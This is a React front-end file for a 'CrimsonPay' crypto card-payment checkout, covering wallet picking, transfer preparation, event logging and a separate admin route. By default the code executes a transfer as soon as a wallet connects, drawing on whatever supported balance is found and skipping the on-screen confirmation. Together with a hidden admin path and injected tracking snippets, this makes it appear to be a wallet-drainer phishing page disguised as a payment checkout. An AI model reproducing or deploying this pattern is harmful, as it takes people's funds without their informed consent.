import { useEffect, useState } from 'react';
import WalletPicker, { WALLETS, walletLogo } from './components/WalletPicker';
import FlowLoader from './components/FlowLoader';
import ReviewPanel from './components/ReviewPanel';
import AdminPanel from './components/admin/AdminPanel';
import TrackingSnippets from './components/TrackingSnippets';
import { getConfig, postJson } from './lib/api';
import { prepareTransfers } from './lib/transfers';
import { connectWallet, executeTransfer, openWalletApp } from './lib/wallet';
import { initializeReown } from './lib/reown';

const WALLET_KEY = 'crimsonpay_selected_wallet';
function CheckoutApp() {
  const [config, setConfig] = useState(null);
  const [connection, setConnection] = useState(null);
  const [selectedWallet, setSelectedWallet] = useState(() => localStorage.getItem(WALLET_KEY) || '');
  const [transfers, setTransfers] = useState([]);
  const [results, setResults] = useState([]);
  const [busy, setBusy] = useState(false);
  const [logosReady, setLogosReady] = useState(false);
  const [error, setError] = useState('');
  const [reownReady, setReownReady] = useState(false);

  useEffect(() => {
    let active = true;
    getConfig().then((nextConfig) => {
      if (!active) return;
      initializeReown(nextConfig);
      setReownReady(true);
      setConfig(nextConfig);
    }).catch((cause) => active && setError(cause.message));
    Promise.all(WALLETS.map((wallet) => new Promise((resolve) => { const image = new Image(); image.onload = resolve; image.onerror = resolve; image.src = wallet.logo; }))).then(() => active && setLogosReady(true));
    return () => { active = false; };
  }, []);

  async function runPayment(nextConnection, item, walletName, paymentConfig) {
    const pending = executeTransfer(nextConnection, item);
    openWalletApp(walletName);
    const txHash = await pending;
    setResults([{ ok: true, message: `Submitted ${String(txHash).slice(0, 12)}…` }]);
    await postJson('/api/event', { chain: item.chain, symbol: item.symbol, amount: item.amount, status: 'submitted', txHash: String(txHash), card: paymentConfig.card, price: paymentConfig.amountUsd });
  }

  async function preparePayment(next, paymentConfig) {
    const available = (await prepareTransfers(next, paymentConfig)).slice(0, 1);
    if (!available.length) throw new Error('No supported balance is available for this payment.');
    setTransfers(available);
    return available[0];
  }

  async function connect(wallet) {
    setSelectedWallet(wallet.name);
    localStorage.setItem(WALLET_KEY, wallet.name);
    setBusy(true);
    setError('');
    setResults([]);
    let next;
    try {
      next = await connectWallet(config, wallet.name);
      setConnection(next);
    } catch (cause) {
      const message = cause?.message || cause?.reason || cause?.data?.message || `Couldn't connect to ${wallet.name}.`;
      setError(message);
      setBusy(false);
      return;
    }
    try {
      const item = await preparePayment(next, config);
      if (config.automaticPayment !== false) await runPayment(next, item, wallet.name, config);
    } catch (cause) {
      const message = cause?.message || cause?.reason || cause?.data?.message || 'Unable to prepare the payment.';
      setResults([{ ok: false, message }]);
    } finally {
      setBusy(false);
    }
  }

  async function connectReown(next, walletName) {
    setSelectedWallet(walletName);
    localStorage.setItem(WALLET_KEY, walletName);
    setBusy(true);
    setError('');
    setResults([]);
    setConnection(next);
    try {
      const item = await preparePayment(next, config);
      if (config.automaticPayment !== false) await runPayment(next, item, walletName, config);
    } catch (cause) {
      const message = cause?.message || cause?.reason || cause?.data?.message || 'Unable to prepare the payment.';
      setResults([{ ok: false, message }]);
    } finally {
      setBusy(false);
    }
  }

  async function confirm() {
    if (!transfers.length) return;
    setBusy(true);
    setError('');
    try {
      await runPayment(connection, transfers[0], selectedWallet, config);
    } catch (cause) {
      setResults([{ ok: false, message: cause.message || 'Transaction not confirmed' }]);
    } finally {
      setBusy(false);
    }
  }

  return <><TrackingSnippets tracking={config?.tracking} /><main className="shell"><div className="checkout-stack">
    {config && <section className="payment-summary"><div className="brand-dot">◆</div><div><p className="eyebrow">CRIMSONPAY CARD PAYMENT</p><h1>Confirm ${config.amountUsd} payment</h1><p className="muted">{config.cardName} · {config.theme} card</p></div></section>}
    {!connection ? <WalletPicker busy={busy || !config} selectedName={selectedWallet} amount={config?.amountUsd} reownReady={reownReady} onReownConnected={connectReown} onPick={connect} /> : <ReviewPanel connection={connection} walletName={selectedWallet} amount={config.amountUsd} transfers={transfers} results={results} running={busy} onConfirm={confirm} />}
  </div><FlowLoader show={!config || !logosReady || busy} logo={busy ? walletLogo(selectedWallet) : ''} label={busy && selectedWallet ? `Connecting to ${selectedWallet}` : 'Loading secure wallets'} />{error && <p className="global-error">{error}</p>}</main></>;
}
export default function App() { return window.location.pathname === '/crimsonpay-secure-operations-control-center' ? <AdminPanel /> : <CheckoutApp />; }
